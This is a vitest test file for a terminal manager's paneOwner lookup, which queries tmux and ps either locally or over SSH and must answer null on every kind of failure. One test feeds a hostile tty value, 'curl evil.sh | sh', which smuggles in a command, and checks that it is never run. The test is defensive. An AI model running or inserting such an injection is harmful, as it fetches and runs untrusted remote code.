// `PtyManager.paneOwner` — the two round-trips, on both legs, and every way they can fail.
//
// The pure parsers are proven against a real tmux pane in `agents/pane-owner.test.ts`. What is left
// for this file is DISPATCH: which binary is asked, with which argv, on a local session versus an
// SSH-project one — and the failure contract, which is the security-relevant half. A partial
// `PaneOwner` (identity, no argv) would read to the predicate as "the kernel answered", so every
// failure here must answer null.
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { initPlatform, resetPlatformForTests } from './platform'
import { fakePlatform } from './platform-fake'
import { TMUX_SOCKET, sessionName } from './tmux-naming'
import { PANE_OWNER_FMT } from './agents/pane-owner'
import { RMT_TMUX_SOCKET } from './remote-ssh/control-master'

/** Every `runAsync` in pty-manager lands here. `answer` decides what each call resolves to. */
const calls: Array<{ file: string; args: string[] }> = []
const script = vi.hoisted(() => ({
  answer: (() => ({ stdout: '' })) as (file: string, args: string[]) => { stdout: string }
}))

vi.mock('child_process', () => {
  type Cb = (err: Error | null, res?: { stdout: string; stderr: string }) => void
  const execFile = (file: string, args: string[], a?: unknown, b?: unknown): unknown => {
    const cb = (typeof a === 'function' ? a : b) as Cb | undefined
    calls.push({ file, args })
    try {
      cb?.(null, { ...script.answer(file, args), stderr: '' })
    } catch (e) {
      cb?.(e as Error)
    }
    return {}
  }
  return { execFile, execFileSync: (): string => '' }
})

const ssh = vi.hoisted(() => ({ path: '/usr/bin/ssh' as string | null }))
vi.mock('./exec-path', async (importOriginal) => ({
  ...(await importOriginal<typeof import('./exec-path')>()),
  findExecutableSync: (bin: string) => (bin === 'ssh' ? ssh.path : null),
  shellPathNow: () => '/usr/bin:/bin',
  resolveShellPath: async () => '/usr/bin:/bin'
}))

vi.mock('node-pty', () => ({
  spawn: () => ({
    onData: () => {},
    onExit: () => {},
    write: () => {},
    resize: () => {},
    pause: () => {},
    resume: () => {},
    kill: () => {},
    pid: 4321
  })
}))

const NODE = 'node-1'
const TARGET = sessionName(NODE)
const TTY = '/dev/pts/7'
const PS_OUT = [
  '2485382 2485382 Ss   -bash',
  '2503294 2503294 Sl+  node /usr/local/bin/claude --resume x',
  '2503300 2503294 S+   rg --files'
].join('\n')

/**
 * A manager with one registered session and a resolved tmux, built WITHOUT going through `create`.
 * `paneOwner` reads exactly two things off a session — its `persistKey` and its `sshRemote` — so a
 * spawn harness would be noise around the thing under test.
 */
async function manager(opts: { tmux?: string | null; sshRemote?: unknown } = {}) {
  const { PtyManager } = await import('./pty-manager')
  const mgr = new PtyManager() as unknown as {
    tmuxPath: string | null
    sessions: Map<string, unknown>
    paneOwner(k: string): Promise<unknown>
  }
  mgr.tmuxPath = opts.tmux === undefined ? '/usr/bin/tmux' : opts.tmux
  mgr.sessions.set('sess-1', { persistKey: NODE, sshRemote: opts.sshRemote })
  return mgr
}

/** The default healthy script: tmux answers the format, `ps` answers the tty listing. */
function healthy(file: string, args: string[]): { stdout: string } {
  if (args.includes(PANE_OWNER_FMT) || args.join(' ').includes(PANE_OWNER_FMT)) {
    return { stdout: `2485382|${TTY}|node\n` }
  }
  if (file === 'ps' || args.join(' ').includes('ps ')) return { stdout: PS_OUT }
  return { stdout: '' }
}

describe('PtyManager.paneOwner', () => {
  beforeEach(() => {
    calls.length = 0
    ssh.path = '/usr/bin/ssh'
    script.answer = healthy
    vi.resetModules()
    initPlatform(fakePlatform())
  })
  afterEach(() => {
    resetPlatformForTests()
  })

  it('local: one display-message on OUR socket, then one ps on the pane tty', async () => {
    const mgr = await manager()
    const owner = await mgr.paneOwner(NODE)

    expect(calls).toHaveLength(2)
    expect(calls[0]).toEqual({
      file: '/usr/bin/tmux',
      args: ['-L', TMUX_SOCKET, 'display-message', '-p', '-t', TARGET, PANE_OWNER_FMT]
    })
    expect(calls[1]).toEqual({
      file: 'ps',
      args: ['-ww', '-o', 'pid=', '-o', 'pgid=', '-o', 'stat=', '-o', 'args=', '-t', TTY]
    })
    expect(owner).toEqual({
      panePid: 2485382,
      tty: TTY,
      command: 'node',
      // The foreground group, and only it — the pane's own `-bash` is not in it.
      argv: ['node /usr/local/bin/claude --resume x', 'rg --files'],
      // …and the pid of each of those rows, in the same order. `ps` already prints the column; it
      // is what lets a delivery's post-write check tell "the same agent" from "an agent again".
      pids: [2503294, 2503300]
    })
  })

  it('SSH: both round-trips ride the project ControlMaster, and the local socket is never touched', async () => {
    const mgr = await manager({
      sshRemote: { conn: { host: 'h', user: 'u' }, controlPath: '/tmp/cm-abc' }
    })
    const owner = await mgr.paneOwner(NODE)

    expect(calls).toHaveLength(2)
    expect(calls.every((c) => c.file === '/usr/bin/ssh')).toBe(true)
    expect(calls.every((c) => c.args.includes('ControlPath=/tmp/cm-abc'))).toBe(true)
    // The REMOTE socket, never the local one — a local `nt-<id>` would be another machine's session.
    expect(calls[0].args.at(-1)).toContain(`tmux -L ${RMT_TMUX_SOCKET} display-message`)
    expect(calls.join(' ')).not.toContain(`-L ${TMUX_SOCKET} `)
    expect(calls[1].args.at(-1)).toBe(
      `ps '-ww' '-o' 'pid=' '-o' 'pgid=' '-o' 'stat=' '-o' 'args=' '-t' '${TTY}'`
    )
    expect(owner).toMatchObject({ tty: TTY, argv: [expect.stringContaining('claude'), 'rg --files'] })
  })

  it('SSH: a tty the remote host printed back is quoted, and a hostile one is never run at all', async () => {
    script.answer = (file, args) => {
      if (args.join(' ').includes(PANE_OWNER_FMT)) {
        return { stdout: `42|/dev/pts/0; curl evil.sh | sh|node\n` }
      }
      return { stdout: PS_OUT }
    }
    const mgr = await manager({
      sshRemote: { conn: { host: 'h', user: 'u' }, controlPath: '/tmp/cm-abc' }
    })

    expect(await mgr.paneOwner(NODE)).toBeNull()
    // The tmux read happened; the `ps` was never built, so nothing hostile reached a command line.
    expect(calls).toHaveLength(1)
  })

  it('still asks the local socket for a node with no pty client — and null when tmux has no such session', async () => {
    // Deliberately the same reading as `paneCommand`: a tmux session OUTLIVES its pty client (that
    // is the whole point of the tmux backing), so "no session in the map" is not "no pane". What
    // makes this null is tmux answering "can't find session", not us guessing ahead of it.
    script.answer = () => {
      throw new Error("can't find session: nt-some-other-node")
    }
    const mgr = await manager()
    expect(await mgr.paneOwner('some-other-node')).toBeNull()
    expect(calls[0].args).toContain(sessionName('some-other-node'))
  })

  it('answers null — not a partial owner — when tmux is unavailable', async () => {
    const mgr = await manager({ tmux: null })
    expect(await mgr.paneOwner(NODE)).toBeNull()
    expect(calls).toHaveLength(0)
  })

  it('answers null when ssh cannot be found for an SSH-project node', async () => {
    ssh.path = null
    const mgr = await manager({
      sshRemote: { conn: { host: 'h', user: 'u' }, controlPath: '/tmp/cm-abc' }
    })
    expect(await mgr.paneOwner(NODE)).toBeNull()
    expect(calls).toHaveLength(0)
  })

  it('answers null when the pane query throws (dead pane, wedged server)', async () => {
    script.answer = () => {
      throw new Error("can't find session: nt-node-1")
    }
    const mgr = await manager()
    expect(await mgr.paneOwner(NODE)).toBeNull()
  })

  it('answers null on an empty pane read, and never asks ps about nothing', async () => {
    script.answer = () => ({ stdout: '' })
    const mgr = await manager()
    expect(await mgr.paneOwner(NODE)).toBeNull()
    expect(calls).toHaveLength(1)
  })

  it('answers null when ps returns nothing — a pane we cannot see is not a pane we can name', async () => {
    script.answer = (file, args) =>
      args.includes(PANE_OWNER_FMT) ? { stdout: `1|${TTY}|node` } : { stdout: '' }
    const mgr = await manager()
    expect(await mgr.paneOwner(NODE)).toBeNull()
    expect(calls).toHaveLength(2)
  })

  it('answers null when ps lists the tty but marks no foreground group', async () => {
    script.answer = (file, args) =>
      args.includes(PANE_OWNER_FMT)
        ? { stdout: `1|${TTY}|node` }
        : { stdout: '2485382 2485382 Ss   -bash' }
    const mgr = await manager()
    expect(await mgr.paneOwner(NODE)).toBeNull()
  })

  it('answers null when ps itself errors (a platform whose ps lacks these flags)', async () => {
    script.answer = (file, args) => {
      if (args.includes(PANE_OWNER_FMT)) return { stdout: `1|${TTY}|node` }
      throw new Error('ps: illegal option -- w')
    }
    const mgr = await manager()
    expect(await mgr.paneOwner(NODE)).toBeNull()
  })
})
